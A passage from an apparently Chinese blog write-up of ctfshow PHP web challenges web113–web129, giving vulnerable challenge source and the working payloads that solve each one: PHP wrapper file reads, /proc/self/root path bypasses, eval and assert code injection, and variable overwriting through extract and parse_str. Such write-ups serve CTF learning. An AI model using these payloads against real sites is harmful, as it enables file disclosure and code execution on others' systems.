href="https://www.php.net/manual/zh/wrappers.php">支持的协议和封装协议</a></p></li></ul><p>通过GET方式传入一个参数file，判断是否为文件类型且进行了黑名单过滤。</p><ol start="2"><li>构造payload<br>可以使用伪协议绕过is_file和highlight_file函数，于是有以下两种构造方法：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br><span class="line"></span><br><span class="line">?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure>成功拿到flag</li></ol><h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>is_file()目录溢出漏洞<br>linux里 <code>/proc/self/root</code> 是指向根目录的，也就是如果在命令行中输入<code>ls /proc/self/root</code> ，其实显示的内容是根目录下的内容<br>多次重复后绕过 <code>is_file</code><br><code>/proc/self</code> 指向当前进程的 <code>/proc/pid/</code> , <code>/proc/self/root</code> 是一个指向 <code>/</code> 的软连接<br><a href="https://www.anquanke.com/post/id/213235">参考文章</a></li></ul><p>本题的源代码与上一题相比，在 <code>preg_match</code> 处增加了filter这个过滤器，那么无法使用php伪协议。</p><ol start="2"><li>构造payload<br>还能使用的是这个payload：<br><code>?file=compress.zlib://flag.php</code><br>还有另一种目录溢出的方法：<br><code>?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code><br>成功拿到flag</li></ol><h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有什么好说的，和前两题比较相似，区别在于增加了过滤compress, root zip等等，不过没有再过滤filter，于是可以老办法。</p></li><li><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure><p>成功拿到flag</p></li></ol><h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>trim()函数<br>去除字符串首尾处的空白字符（或者其他字符）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">trim(string $string, string $characters = &quot; \n\r\t\v\x00&quot;): string</span><br><span class="line">此函数返回字符串 string 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符：</span><br><span class="line">&quot; &quot; (ASCII 32 (0x20))，普通空格符。</span><br><span class="line">&quot;\t&quot; (ASCII 9 (0x09))，制表符。</span><br><span class="line">&quot;\n&quot; (ASCII 10 (0x0A))，换行符。</span><br><span class="line">&quot;\r&quot; (ASCII 13 (0x0D))，回车符。</span><br><span class="line">&quot;\0&quot; (ASCII 0 (0x00))，空字节符。</span><br><span class="line">&quot;\v&quot; (ASCII 11 (0x0B))，垂直制表符。</span><br></pre></td></tr></table></figure></li></ul><p>过滤了以上不同进制，点号，科学计数法和加号等。我们通过实验发现，当is_numeric()函数判断 <code> 36</code> 时，依然会当作是数字，而在中间和最后插入符号则不会当作是数字，于是突破口可以选择在数字最前面插入某种符号来绕过。</p><ol start="2"><li>构造payload<br>思路即为在数字前插入符号，但很多符号被trim函数过滤了，最终只有&#x2F;f（换页符）成功绕过<br>构造出payload如下：<br><code>?num=%0c36</code><br>成功拿到flag</li></ol><h1 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>$_SERVER<br><code>$_SERVER</code> 是 PHP 预定义变量之一，可以直接使用，它是一个包含了诸如头信息（header）、路径（path）及脚本位置（script locations）信息的数组。<br><code>$_SERVER[&#39;argv&#39;]</code> 传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。query string（查询字符串），如果有的话，通过它进行页面访问。</li></ul><p><a href="https://www.php.net/manual/zh/reserved.variables.server">SERVER更详细的解释</a></p><ul><li><p>PHP中非法参数传参<br>PHP中传参的合法参数只有字母数字下划线，出现非法参数(. [ ] 空格等)会自动转化为下划线(_)。<br>当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线_，也就是说如果中括号[出现在前面，那么中括号[还是会被转换成下划线_，但是因为出错导致接下来的非法字符并不会被转换成下划线_<br>这个问题在PHP8中得到修复。<br>更详细的解释参考这篇文章：<a href="https://blog.csdn.net/mochu7777777/article/details/115050295">谈一谈PHP中关于非法参数名传参问题</a></p></li><li><p>extract()函数<br> 从数组中将变量导入到当前的符号表</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">extract(array &amp;$array, int $flags = EXTR_OVERWRITE, string $prefix = &quot;&quot;): int</span><br><span class="line">本函数用来将变量从数组中导入到当前的符号表中。</span><br><span class="line">检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。</span><br><span class="line">警告</span><br><span class="line">不要对不可信的数据使用 extract()，类似用户输入 （例如 $_GET、$_FILES）。</span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/function.extract">更详细的解释</a></p></li><li><p>get_defined_vars()函数<br>返回由所有已定义变量所组成的数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars(): array</span><br><span class="line">此函数返回多维数组。包含调用 get_defined_vars() 作用域内所有已定义的变量、环境变量、服务器变量、用户定义变量列表。</span><br></pre></td></tr></table></figure></li><li><p>implode()函数<br>用字符串连接数组元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">implode(string $separator, array $array): string</span><br><span class="line">返回一个包含所有数组元素并且顺序相同的字符串， 每个元素之间有 separator 分隔。</span><br></pre></td></tr></table></figure></li></ul><p>POST方法传入fun，CTF_SHOW，CTF_SHOW.COM。并且不能以GET方法传入fl0g。<br>fun经过了一些过滤，如果绕开了过滤则能作为代码执行，之后如果变量fl0g全等于flag_give_me，则输出flag</p><ol start="2"><li>构造payload<br>这一题构造payload的方法非常多，因为给的空间很大。<br>第1种：<br>最简单，直接在eval代码执行的时候就输出flag：<br>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code><br>第2种：<br>通过SERVER构造payload：<br>GET: <code>?$fl0g=flag_give_me;</code><br>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=eval($a[0])</code><br>第3种：<br>通过函数输出构造payload：<br>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo implode(get_defined_vars())</code><br>最后是通过变量覆盖的两个函数构造出两种payload：<br>第4种：<br>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fl0g=flag_give_me&amp;fun=extract($_POST)</code><br>第5种：<br>+隔断argv<br>GET: <code>?a=1+fl0g=flag_give_me</code><br>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</code></li></ol><p>均可成功拿到flag</p><h1 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只是比之前多过滤了一些字符，区别不大。</p></li><li><p>构造payload<br>上一题中第4，5种方法仍然能用。<br>此外可以使用highlight_file()函数打印输出一个文件，而我们只需要想办法把这个文件变成flag.php即可。<br>GET: <code>?1=flag.php</code><br>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1])</code><br>成功拿到flag</p></li></ol><h1 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>assert()函数<br>检查断言是否为 false<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assert(mixed $assertion, string $description = ?): bool</span><br><span class="line">传统断言（PHP 5 和 7）</span><br><span class="line">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br></pre></td></tr></table></figure><a href="https://www.php.net/manual/zh/function.assert.php">官方文档</a></li></ul><p>增加过滤了几个字符。</p><ol start="2"><li>构造payload<br>上上题中第2,5种方法仍然能用。<br>另一种方法是代码执行：<br>GET: <code>?$fl0g=flag_give_me</code><br>POST: <code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0])</code><br>成功拿到flag</li></ol><h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大意就是用waf检测整个url，不在黑名单中的才能绕过。通过变量覆盖，相当于GET传入一个变量ctf_show</p></li><li><p>构造payload<br>由于黑名单过滤了下划线(_)，所以需要用空格代替，因为空格是非法字符，会自动转化为下划线。<br>于是我们构造payload符合条件，便能得到flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctf show=ilove36d</span><br></pre></td></tr></table></figure><p>成功拿到flag</p></li></ol><h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>gettext()函数<br>在当前域中查找信息<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gettext(string $message): string</span><br><span class="line">如果在翻译表中找到一个已翻译的字符串，则返回一个已翻译的字符串，如果未找到，则返回提交的消息。</span><br><span class="line">注意：</span><br><span class="line">可以使用下划线字符“_”作为此函数的别名。</span><br></pre></td></tr></table></figure></li></ul><p>通过GET传入两个参数f1,f2。参数f1不能包含数字和字母。<br>可以使用gettext函数，通过别名下划线（_）来绕开检查。<br>经过连续两个回调函数后输出值。</p><ol start="2"><li>构造payload<br>参数f1用下划线绕开检查，然后参数f2可以使用get_defined_vars返回所有信息，其中就包括了变量名与变量的值。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>成功拿到flag</li></ol><h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span 